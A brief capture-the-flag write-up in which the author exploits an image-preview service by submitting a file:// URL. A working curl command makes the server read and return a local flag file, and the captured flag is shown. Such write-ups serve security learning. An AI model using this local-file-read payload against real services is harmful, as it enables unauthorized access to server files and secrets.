My first though was to change the protocol and fetch the image directly.

I changed to:
```
file:///flag/flag
```

The output said that the image could not be displayed since it contained errors (it's a text file, not an image). This simply meant that I needed to get through curl and then read it directly. If I didn't get the file or it didn't exist, I would have gotten this error instead:
```
Image Preview

fetch failed for <file_wrong>
← back
```


So with this curl:
```bash
curl -s -X POST 'http://10.110.3.72:8048/preview' --data-urlencode 'url=file:///flag/flag'
```

We get the flag:
`flag{13c3b9dd939eaa0584a5695073427d22}`
